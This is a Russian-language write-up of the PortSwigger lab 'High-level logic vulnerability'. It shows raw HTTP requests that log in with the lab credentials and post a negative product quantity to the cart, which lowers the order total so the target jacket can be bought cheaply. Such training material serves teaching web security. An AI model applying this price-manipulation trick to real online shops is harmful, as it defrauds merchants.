---
title: "High-level logic vulnerability"
date: 2025-10-23
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-high-level"
classes: wide
---

В лабе плохо валидируется ввод. Для прохождения нужно купить `Lightweight l33t leather jacket`. Даны креды для учетной записи `wiener`:`peter`.

```
https://0ab000a804be19f1810198cc00310021.web-security-academy.net/
```

# Solution

Зайду в ЛК. 

```http
POST /login HTTP/2
Host: 0ab000a804be19f1810198cc00310021.web-security-academy.net
Cookie: session=EJJfKxdsWv6s9HPUkUCxtQuxovK2Q5lZ
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ab000a804be19f1810198cc00310021.web-security-academy.net/login
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Origin: https://0ab000a804be19f1810198cc00310021.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

csrf=R9t0O6GqgiZOVnREVHHS6VRp3PlJ4GnE&username=wiener&password=peter
```

Добавлю и куплю товар:

```http
POST /cart HTTP/2
Host: 0ab000a804be19f1810198cc00310021.web-security-academy.net
Cookie: session=EJJfKxdsWv6s9HPUkUCxtQuxovK2Q5lZ
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ab000a804be19f1810198cc00310021.web-security-academy.net/product?productId=3
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: https://0ab000a804be19f1810198cc00310021.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

productId=3&redir=PRODUCT&quantity=1
```

```http
POST /cart/checkout HTTP/2
Host: 0ab000a804be19f1810198cc00310021.web-security-academy.net
Cookie: session=TXt9fRLvAo4pK8N6YO4uKYsVEeN1s9Dy
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ab000a804be19f1810198cc00310021.web-security-academy.net/cart
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: https://0ab000a804be19f1810198cc00310021.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

csrf=Ly9cEQvMmiwvcom3wGFsMeXBKmQYNQ1U
```

Хмм. Мне не дает покоя поле `quantity`. Попробую подставить в него отрицательное значение:

```http
POST /cart HTTP/2
Host: 0ab000a804be19f1810198cc00310021.web-security-academy.net
Cookie: session=TXt9fRLvAo4pK8N6YO4uKYsVEeN1s9Dy
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ab000a804be19f1810198cc00310021.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: https://0ab000a804be19f1810198cc00310021.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

productId=1&redir=PRODUCT&quantity=-2
```

Замечательно:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_blv/IMG_high-level/1.png){: height="200" .align-center}

Хмм. Просчитались, но где... Ок. Добавим в корзину что-нибудь еще.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_blv/IMG_high-level/2.png){: height="200" .align-center}

Нужны ли мне 15 бассейнов? Да!

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_blv/IMG_high-level/3.png){: height="200" .align-center}

У меня получилось сделать заказ. Но есть проблема. Мне нужно сделать баланс отрицательным, а потом добавить куртку. Сделаю это:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_blv/IMG_high-level/4.png){: height="200" .align-center}

15 бассейнов оказались лишними. Ну да ладно. Лаба решена)

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_blv/IMG_high-level/5.png){: height="200" .align-center}